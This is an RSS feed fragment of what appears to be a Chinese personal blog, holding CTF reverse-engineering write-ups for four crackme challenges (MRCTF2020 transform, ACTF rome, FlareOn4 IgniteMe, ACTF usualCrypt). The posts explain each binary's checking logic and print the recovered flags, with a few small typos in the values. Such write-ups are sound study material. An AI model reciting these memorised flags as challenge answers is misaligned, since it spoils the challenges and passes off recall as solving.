        <guid>https://dorinxl.github.io/p/mrctf2020transform/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163317504-2122781916.png&#34;
	width=&#34;500&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163317504-2122781916_hu8605736927393364454.png 480w, https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163317504-2122781916_hu5591010667531840680.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;281px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;随便水一道签到题：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318058-763317955.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318058-763317955_hu10717387779982599986.png 480w, https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318058-763317955_hu13750895186781015711.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;没有壳，静态分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318550-445960623.png&#34;
	width=&#34;629&#34;
	height=&#34;602&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318550-445960623_hu6274985846393918706.png 480w, https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318550-445960623_hu391608226791403811.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;104&#34;
		data-flex-basis=&#34;250px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;输入flag，处理判断得出结果。&lt;/p&gt;
&lt;p&gt;很简单，程序逻辑是将输入的flag按照以dword_40F040数组的内容作为下标保存在byte数组中，然后异或处理，对比判断。反着写：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318999-273435205.png&#34;
	width=&#34;974&#34;
	height=&#34;326&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318999-273435205_hu16512908407253501092.png 480w, https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163318999-273435205_hu4973937221589433014.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;298&#34;
		data-flex-basis=&#34;717px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163319287-118509770.png&#34;
	width=&#34;317&#34;
	height=&#34;30&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163319287-118509770_hu10191156420376954492.png 480w, https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163319287-118509770_hu1299726701469476388.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1056&#34;
		data-flex-basis=&#34;2536px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;RCTF{Tr4nsp0sltiON_Clph3r_1s_3z}&lt;/p&gt;
&lt;p&gt;bb两句：&lt;/p&gt;
&lt;p&gt;昨天和前天好像没更新，去打安恒月赛xBJDCTF3th了，然而并没有做出来几个题。&lt;/p&gt;
&lt;p&gt;然后中间就开始研究青龙组那个虚拟机的题，好像安恒月赛也出了个，随后放一下青龙组那个signal的wp，第一次做有够麻烦的。&lt;/p&gt;
&lt;p&gt;对了今天早上的人生高光时刻：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163319857-782048198.png&#34;
	width=&#34;1008&#34;
	height=&#34;579&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163319857-782048198_hu12489990107012191005.png 480w, https://dorinxl.github.io/p/mrctf2020transform/1858293-20200524163319857-782048198_hu4043546886442709378.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;174&#34;
		data-flex-basis=&#34;417px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;虽然仅仅在第一呆了几分钟但我也是值了。&lt;/p&gt;
&lt;p&gt;一会写完那个signal的wp就出去骑个十公里歇会。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【ACTF新生赛2020】rome</title>
        <link>https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/</link>
        <pubDate>Thu, 21 May 2020 13:12:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211221676-993740297.png&#34;
	width=&#34;500&#34;
	height=&#34;378&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211221676-993740297_hu2169677216020499638.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211221676-993740297_hu342570434759119049.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;132&#34;
		data-flex-basis=&#34;317px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下载是exe文件，运行一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211221902-1379421674.png&#34;
	width=&#34;162&#34;
	height=&#34;30&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211221902-1379421674_hu9030468568245916547.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211221902-1379421674_hu7239479121772899235.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;540&#34;
		data-flex-basis=&#34;1296px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;很简单，依旧是输入-处理-判断。&lt;/p&gt;
&lt;p&gt;查壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211222353-29194234.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211222353-29194234_hu12966662444500724205.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211222353-29194234_hu17888536994100345547.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;没壳，扔进IDA：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211222781-321951986.png&#34;
	width=&#34;507&#34;
	height=&#34;828&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211222781-321951986_hu17124569494279452779.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211222781-321951986_hu14229189224167518353.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;61&#34;
		data-flex-basis=&#34;146px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;只有一处判断，将其范围内的字符处理后对比。&lt;/p&gt;
&lt;p&gt;很简单，我一开始的思路是精准打击，找出被处理的字符串的ascii范围，写了一半感觉有点麻烦，不如直接爆破：&lt;/p&gt;
&lt;p&gt;就硬对应：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211223370-1089910148.png&#34;
	width=&#34;760&#34;
	height=&#34;366&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211223370-1089910148_hu14584635649823704320.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211223370-1089910148_hu5979025482336652573.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211223670-1409155968.png&#34;
	width=&#34;150&#34;
	height=&#34;27&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211223670-1409155968_hu5300459045222259012.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020rome/1858293-20200521211223670-1409155968_hu15067134660504273874.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;555&#34;
		data-flex-basis=&#34;1333px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Cae3ar_th4_Gre@t&lt;/p&gt;
&lt;p&gt;最后bb两句：&lt;/p&gt;
&lt;p&gt;521我也在勤勉的做题啊！（懒狗，水博客还好意思说）&lt;/p&gt;
&lt;p&gt;现在上着选修，讲的是算法竞赛的知识。还是年少轻狂觉得自己可以驾驭这种比赛。其实已经没有在听了。&lt;/p&gt;
&lt;p&gt;了解了一下自由选修挂科的后果，好像除了白上一学期没别的了。白上就白上吧，实在不合适。只要不影响我的总成绩就好。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【FlareOn4】IgniteMe</title>
        <link>https://dorinxl.github.io/p/flareon4igniteme/</link>
        <pubDate>Wed, 20 May 2020 09:31:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/flareon4igniteme/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173125662-2059497393.png&#34;
	width=&#34;500&#34;
	height=&#34;378&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173125662-2059497393_hu17072181889933829818.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173125662-2059497393_hu13677370542219885051.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;132&#34;
		data-flex-basis=&#34;317px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126145-1674202376.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126145-1674202376_hu10258101946835079775.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126145-1674202376_hu4828471214965797698.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;没壳，跑一下看看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126499-1428322788.png&#34;
	width=&#34;296&#34;
	height=&#34;34&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126499-1428322788_hu14243575065070040110.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126499-1428322788_hu9988862891616469416.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;870&#34;
		data-flex-basis=&#34;2089px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;经典输入处理判断，扔进IDA看一看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126771-120795258.png&#34;
	width=&#34;625&#34;
	height=&#34;252&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126771-120795258_hu2675575020297294855.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173126771-120795258_hu14936087164573011176.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;248&#34;
		data-flex-basis=&#34;595px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;框架比较简单，但是简单的框架内容可不一定简单。&lt;/p&gt;
&lt;p&gt;一些API函数，念着英文就知道什么意思了。看一下读取数据的函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127073-1740793258.png&#34;
	width=&#34;498&#34;
	height=&#34;433&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127073-1740793258_hu1638215731545949165.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127073-1740793258_hu14799567935087593299.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;115&#34;
		data-flex-basis=&#34;276px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;中规中矩的，把读入的&amp;rsquo;\n&amp;rsquo;和&amp;rsquo;\r&amp;rsquo;过滤一下。&lt;/p&gt;
&lt;p&gt;看一下处理和判断的函数：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127350-128573595.png&#34;
	width=&#34;445&#34;
	height=&#34;346&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127350-128573595_hu11893967486813881564.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127350-128573595_hu8438904592470072974.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;128&#34;
		data-flex-basis=&#34;308px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;大体逻辑是这样的：&lt;/p&gt;
&lt;p&gt;v0是长度，v4是一个给定的数值。循环处理flag，将其倒序与v4亦或的结果保存，替换v4内容，继续下一位。&lt;/p&gt;
&lt;p&gt;由于结果已经给出了，我们要做的就是逆向写一遍这个算法。但是我们缺少v4的内容，不知道v4就不知道其他位置的flag。&lt;/p&gt;
&lt;p&gt;关于v4的这个函数sub_401000，我们不能立马得到结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127688-1688310486.png&#34;
	width=&#34;428&#34;
	height=&#34;74&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127688-1688310486_hu2252793954520162003.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173127688-1688310486_hu1172686849736149388.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;578&#34;
		data-flex-basis=&#34;1388px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这是一个没见过的函数，具体处理也不是很懂。&lt;/p&gt;
&lt;p&gt;这里其实可以用od看一下运算结果，但是我用不熟od，好歹拖进去看一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128339-891064326.png&#34;
	width=&#34;742&#34;
	height=&#34;54&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128339-891064326_hu12875064904167019443.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128339-891064326_hu3453835713008948598.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1374&#34;
		data-flex-basis=&#34;3297px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里调用了401000函数，然后把al存了起来。&lt;/p&gt;
&lt;p&gt;手动计算401000：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128616-2039023577.png&#34;
	width=&#34;501&#34;
	height=&#34;186&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128616-2039023577_hu7759496238458780217.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128616-2039023577_hu16651335990376312919.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;269&#34;
		data-flex-basis=&#34;646px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Eax和edx存入0x80070057。Ax异或，eax左移4，ax右移1。&lt;/p&gt;
&lt;p&gt;这里注意eax是32位而ax是16位，ax取0x0057，rol循环左移不舍弃，shr右移舍弃高位0补足。得到的结果是0x0x700004&lt;/p&gt;
&lt;p&gt;然后al是8位，也就是04，所以v4 = 4；（老实说我并不明白这里为什么v4就是al的值）&lt;/p&gt;
&lt;p&gt;逆向算法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128947-511825330.png&#34;
	width=&#34;945&#34;
	height=&#34;323&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128947-511825330_hu11991627911185880440.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173128947-511825330_hu3430212979035338647.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;292&#34;
		data-flex-basis=&#34;702px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173129212-1935170789.png&#34;
	width=&#34;374&#34;
	height=&#34;30&#34;
	srcset=&#34;https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173129212-1935170789_hu4760043051258709094.png 480w, https://dorinxl.github.io/p/flareon4igniteme/1858293-20200520173129212-1935170789_hu8388502633549397171.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1246&#34;
		data-flex-basis=&#34;2992px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com&#34; &gt;R_y0u_H0t_3n0ugH_t0_1gn1t3@flare-on.com&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【ACTF新生赛2020】usualCrypt</title>
        <link>https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/</link>
        <pubDate>Tue, 19 May 2020 10:56:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185540710-32673582.png&#34;
	width=&#34;500&#34;
	height=&#34;416&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185540710-32673582_hu4278701543337790352.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185540710-32673582_hu17234405923229179184.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;120&#34;
		data-flex-basis=&#34;288px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;下载下来，exe扔进去看看有没有壳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541156-1625029507.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541156-1625029507_hu11969913829248520364.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541156-1625029507_hu1176571530255826641.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;没有，运行一下看看是干啥的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541494-192711794.png&#34;
	width=&#34;327&#34;
	height=&#34;51&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541494-192711794_hu2742600171146205969.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541494-192711794_hu3278268894707657472.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;641&#34;
		data-flex-basis=&#34;1538px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;很普通的界面，输入flag。&lt;/p&gt;
&lt;p&gt;扔进IDA分析一波：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541772-1359278171.png&#34;
	width=&#34;538&#34;
	height=&#34;534&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541772-1359278171_hu12003765545946781182.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185541772-1359278171_hu2022702183771085867.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;100&#34;
		data-flex-basis=&#34;241px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;main函数主体也比较简单，输入&amp;mdash;-处理&amp;mdash;-判断。&lt;/p&gt;
&lt;p&gt;我们进入sub_401080看看，这个函数是将我们输入的v10进行加密，然后存到v5里面。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542096-1949003932.png&#34;
	width=&#34;787&#34;
	height=&#34;583&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542096-1949003932_hu9172347775215536262.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542096-1949003932_hu1242560642054181262.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;134&#34;
		data-flex-basis=&#34;323px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;加密主体跟base64差不多，但是注意这里有两个函数，第一个函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542330-1606565489.png&#34;
	width=&#34;364&#34;
	height=&#34;259&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542330-1606565489_hu13899275112810371313.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542330-1606565489_hu7772789872461816189.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;140&#34;
		data-flex-basis=&#34;337px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个函数是将base64表处理。就是一个交换位置的函数。他将整个表分成了地址相连的两个数组。把两个数组的第6-14位进行交换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542588-491908593.png&#34;
	width=&#34;706&#34;
	height=&#34;264&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542588-491908593_hu16292636039496396524.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542588-491908593_hu10157740730147828839.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;267&#34;
		data-flex-basis=&#34;641px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;交换完毕后是这个样子：ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&lt;/p&gt;
&lt;p&gt;最后这里还有另一个函数：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542821-1542454272.png&#34;
	width=&#34;313&#34;
	height=&#34;76&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542821-1542454272_hu15264609102365730642.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185542821-1542454272_hu7433560240681037373.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;411&#34;
		data-flex-basis=&#34;988px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这个函数是大小写转换：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185543054-122502144.png&#34;
	width=&#34;294&#34;
	height=&#34;487&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185543054-122502144_hu6190890050070137328.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185543054-122502144_hu7001279187255879480.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;60&#34;
		data-flex-basis=&#34;144px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;把原数据zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9转化成：&lt;/p&gt;
&lt;p&gt;ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9&lt;/p&gt;
&lt;p&gt;那么我们倒退一下，因为base64是将3个8位数据转化成4个6位数据，我们不考虑过程，只看结果即可，将被交换的18个字母代入进去：&lt;/p&gt;
&lt;p&gt;ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9&lt;/p&gt;
&lt;p&gt;ZmxhZ3tiQXNlNjRfaDJzX2FfU3VycHJpc2V9&lt;/p&gt;
&lt;p&gt;找个在线网站解密一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185543319-225422881.png&#34;
	width=&#34;433&#34;
	height=&#34;282&#34;
	srcset=&#34;https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185543319-225422881_hu16719031342469295438.png 480w, https://dorinxl.github.io/p/actf%E6%96%B0%E7%94%9F%E8%B5%9B2020usualcrypt/1858293-20200519185543319-225422881_hu3848590509323468739.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;153&#34;
		data-flex-basis=&#34;368px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;最后bb两句：&lt;/p&gt;
&lt;p&gt;不学py真的不行了，c语言实现一些功能有些麻烦，需要这种更高效的语言了。&lt;/p&gt;
